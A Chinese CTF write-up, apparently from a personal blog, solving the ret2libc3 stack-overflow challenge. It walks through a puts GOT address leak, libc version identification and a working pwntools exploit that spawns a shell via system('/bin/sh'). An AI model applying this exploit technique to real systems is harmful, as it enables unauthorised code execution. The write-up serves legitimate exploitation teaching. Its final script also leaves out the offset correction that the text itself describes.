---
layout: post
title: CTF-PWN实例5（ret2libc3）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/5
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例5（ret2libc3）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3

## 程序保护：

```shell
$ checksec ret2libc3
```

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先这里依旧开启了NX保护。

## 程序信息：

```shell
$file ret2libc3
ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped
```

依旧动态链接。

## 解题：

### 一、IDA分析程序溢出点

IDA分析main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

这里依旧是gets()函数造成溢出。但是这里我们可以在函数列表发现system函数。查看此函数的调用点。

```c
void secure()
{
  unsigned int v0; // eax@1
  int input; // [sp+18h] [bp-10h]@1
  int secretcode; // [sp+1Ch] [bp-Ch]@1

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf((const char *)&unk_8048730, &input);
  if ( input == secretcode )
    puts("no_shell_QQ");
}
```

这里的区别在于程序中没有了system函数的调用，这时候我们需要从其他地方调用。

### 二、cyclic和pwndbg判断偏移量

偏移量依然是112，就不做过多篇幅。

### 三、编写EXP

思路：

依然在程序中查找“/bin/sh”字符串，

```
$ ROPgadget --binary ret2libc2 --string '/bin/sh'
Strings information
============================================================
```

发现在程序中找不到相关字符串。

这时候会用到做pwn题经常用到的思路，就是当程序动态链接时，在程序本身找不到利用的函数或参数，我们需要从动态链接文件中获取。

这里先介绍一下我们首先第一步是要通过地址泄露来判断题目服务器所使用的libc版本。

通过pwntools，从plt表中找到puts函数的地址执行，并把got表内的puts地址当成参数。这样就能输出puts函数的地址。

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

context.log_level = 'debug'
p = process('./ret2libc3')
elf = ELF('./ret2libc3')
if args.G:     #开启调试标记
    gdb.attach(p)
p.sendlineafter('!?','a'*112+p32(elf.plt['puts'])+'aaaa'+p32(elf.got['puts']))

p.interactive()
```

输出结果

```
[DEBUG] Sent 0x7d bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000070  60 84 04 08  61 61 61 61  18 a0 04 08  0a           │`···│aaaa│····│·│
    0000007d
[*] Switching to interactive mode
[DEBUG] Received 0x1d bytes:
    00000000  a0 bc d7 f7  76 84 04 08  86 84 04 08  40 45 d3 f7  │····│v···│····│@E··│
    00000010  60 c3 d7 f7  b6 84 04 08  c6 84 04 08  0a           │`···│····│····│·│
    0000001d
\xa0\xbc��v\x84\x0\x86\x84\x0@E��`�����Ƅ\x0
```

这时候再用libc-database工具查找libc的对应的版本

```
~/ctf/libc-database$ ./find puts ca0
ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)
```

下载对应的libc版本放入到exp路径。

之后还需要准备/bin/sh

```
$ ROPgadget --binary libc.so --string '/bin/sh'
Strings information
============================================================
0x0015ba0b : /bin/sh
```

获取主函数地址

```
.text:08048618 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:08048618                 public main
.text:08048618 main            proc near               ; DATA XREF: _start+17o
.text:08048618
.text:08048618 argc            = dword ptr  8
.text:08048618 argv            = dword ptr  0Ch
.text:08048618 envp
```

准备齐全

exp代码：

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

context.log_level = 'debug'
p = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('./libc.so')
if args.G:     #开启调试标记
    gdb.attach(p)
p.sendlineafter('!?','a'*112+p32(elf.plt['puts'])+'aaaa'+p32(elf.got['puts']))
puts_addr = u32(p.recv(4))
libc_base = puts_addr - libc.symbols['puts']

system_addr = libc_base+libc.symbols['system']

binsh = libc_base+0x15ba0b
p.sendlineafter('!?','a'*112+p32(system_addr)+p32(0x08048618)+p32(binsh))
p.interactive()

```

运行时失败，通过 加参数G 调用gdb调试，然后输入c继续执行。这是会显示栈内返回地址错误，但是栈下面的内容和我们构造一样。这是因为第二次从main执行是偏移出现问题。只需要112-8即可。

## 总结

利用动态链接的libc主要是通过地址泄露找到对应的版本，然后获取到偏移地址。